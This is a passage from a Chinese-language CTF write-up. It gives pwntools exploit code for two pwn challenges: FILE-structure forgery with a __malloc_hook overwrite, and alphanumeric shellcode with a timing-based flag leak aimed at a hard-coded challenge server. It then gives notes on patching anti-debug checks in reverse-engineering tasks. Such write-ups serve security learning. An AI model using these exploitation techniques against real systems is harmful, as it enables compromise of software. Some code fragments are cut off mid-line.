    file+= p64(0) +p64(0)
    file+= p64(0x00000000ffffffff)+p64(0)
    file+= p64(0) +p64(0)
    se(p64(0xdeadbeef)*2+p64(buffer+0x18)+file+'\n')
    ru('permitted!\n')
    libc=u64(ru('\x00\x00'))
    base=libc-0x3E82A0
    malloc_hook=base+e.symbols['__malloc_hook']
    sleep(0.2)
    file = p64(0xfbad2887) + p64(malloc_hook)
    file+= p64(malloc_hook) +p64(malloc_hook)
    file+= p64(malloc_hook) +p64(malloc_hook)
    file+= p64(malloc_hook+8) +p64(pbase+0x201FB0)
    file+= p64(pbase+0x201FB0) +p64(0)
    file+= p64(0) +p64(0)
    file+= p64(0) +p64(0)
    file+= p64(1) +p64(0xffffffffffffffff)
    file+= p64(0) +p64(buffer+0x220)
    file+= p64(0xffffffffffffffff) +p64(0)
    file+= p64(buffer+0x230) +p64(0)
    file+= p64(0) +p64(0)
    file+= p64(0x00000000ffffffff)+p64(0)
    file+= p64(0) +p64(0)
    se(p64(base+0x4f322)*2+p64(buffer+0x18)+file+'\n')
    sleep(0.5)
    se('%n\n')
    print(hex(pbase))
    print(hex(libc))
    p.interactive()
## christmas
写shellcode，有seccomp
seccomp 限制了只能执行exit和exit_group 这两个syscall
还限制了只能字母和数字，这个限制可以用alpha3突破（华师非灰也师傅帮忙修好了，能在linux下面跑
程序没开pie，因此能在程序那里拿到libc的地址，然后找libc base
base找到了之后，倒着去搜libflag.so里面bss段的_DYNAMIC
在里面可以找到DT_STRTAB和DT_SYMTAB，然后搜flag_yes_1337，根据偏移再找到  
Elf64_Sym 结构体，最后找到flag_yes_1337函数的地址，call一下拿到flag，然后再盲注出来
    from pwn import *
    import os
    import pwnlib.shellcraft.amd64 as sc
    import time
    context.arch='amd64'
    payload=asm(sc.mov('rdi',0x602030))+\
    asm("mov rdi,[rdi]") +\
    asm(sc.mov('rdx',0x6f690)) +\
    asm('sub rdi,rdx')+ \
    asm(sc.mov('rbx','rdi')) +\
    asm(sc.push(0x6FFFFEF5))+\
    asm('''
    search:
        push 4
        pop rcx
        mov rdi,rbx
        mov rsi,rsp
        cld
        repe cmpsb
        jz  done
        sub rbx,1
        jnz search 
    done: 
    ''')+\
    asm('add rdi,0x14')+\
    asm('mov r10,[rdi]')+\
    asm('add rdi,0x10')+\
    asm('mov r11,[rdi]')+\
    asm('sub rdi,0x40')+\
    asm('mov rcx,[rdi]')+\
    asm('sub rbx,rcx')+\
    asm(sc.mov('rcx',0x80))+\
    asm('sub rbx,rcx')+\
    asm('mov r12,rbx')+\
    asm(sc.pushstr('flag_yes_'))+\
    asm('mov rbx,r10')+\
    asm('''
    search:
        push 8
        pop rcx
        mov rdi,rbx
        mov rsi,rsp
        cld
        repe cmpsb
        jz  done
        add rbx,1
        jnz search 
    done: 
    ''')+\
    asm('sub rdi,0x8')+\
    asm('sub rdi,r10')+\
    asm('push rdi')+\
    asm('mov rbx,r11')+\
    asm('''
    search:
        push 3
        pop rcx
        mov rdi,rbx
        mov rsi,rsp
        cld
        repe cmpsb
        jz  done
        add rbx,1
        jnz search 
    done: 
    ''')+\
    asm('add rdi,5')+\
    asm('mov rdi,[rdi]')+\
    asm('add rdi,r12')+\
    asm('call rdi')
    def generate(idx,c):
        tmp=payload+\
        asm('''
        add al,%d
        xor rbx,rbx
        xor rcx,rcx
        mov bl,[rax]
        add cl,%d
        cmp rbx,rcx
        jz done
        xor rax,rax
        add al,60
        syscall
        done:
        '''%(idx,c))+asm(sc.infloop())
        print(idx,c)
        f=open('alapayload','wb')
        f.write(tmp)
        f.close()
    def brute(idx,c):
        debug=0
        #context.log_level='debug'
        context.arch='amd64'
        if debug:
            p=process('./christmas')
            #p=process('',env={'LD_PRELOAD':'./libc.so'})
            #gdb.attach(p)
        else:
            p=remote('150.109.46.159', 20003)
        def ru(x):
            return p.recvuntil(x)
        def se(x):
            p.send(x)
        if not debug:
            ru('Input your token:')
            se('uvm73jg2AFMECo71DIZRZh39MRqFOI2w\n')
        payload='42'
        generate(idx,c)
        a=os.popen('python ./alpha3/ALPHA3.py x64 ascii mixedcase RAX --input="alapayload"')
        payload+=a.read()
        a.close()
        se(payload)
        ru('can you tell me how to find it??')
        start=time.time()
        p.can_recv_raw(timeout=3)
        p.close()
        end=time.time()
        if end-start>2:
            return True
        return False
    str='{}_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+!@#$%^&*()'
    #brute(4,ord('{'))
    flag='{dyn_15_4w'
    for q in range(14,100):
        for i in range(len(str)):
            if brute(q,ord(str[i])):
                raw_input(str[i])
                flag+=str[i]
                print(flag)
                break
> flag:HCTF{dyn_15_4w350m3}
# RE
## Lucky star
找main函数，发现是smc过的，找找其他地方  
0040155D和004015CA 调用了了一个反调试函数，把参数0x11改成0  
00403148有一段进程名的字符串，全改成0  
0040251b调用了另一个反调试函数，把下方的00402521的jz改成jmp  
全部改完打个补丁，程序就能正常运行了。  
在调用main函数的地方00401C20设下断点，开始调试，断下的时候main函数就解析好了  
先播放了一段音频，中间还有sleep，大概一分钟，不相等可以直接把那一段的cmp jz改成cmp jmp
004015E0是加密函数  
加密算法如下：  
先把输入进行base64加密 a2位base64加密完的  
它的base64大小写是反的
    v14=0
    v19 = strlen(a2);
      if ( v19 > 0 )
      {
        do
        {
          v16 = 6;
          do
          {
            v17 = rand() % 4;
            v18 = v16;
            v16 -= 2;
            result = (_BYTE)v17  -2 );
          ++v14;
        }
        while ( v14  hctf{1zumi_K0nat4_Mo3
## seven
又是驱动逆向  
sub_140001000中kbdclass应该跟键盘有关，但不知道怎么输入的  
sub_1400012F0应该是解密函数了  
中间有一段代码：
    if ( *v6 == 0x11 )                        // up
          {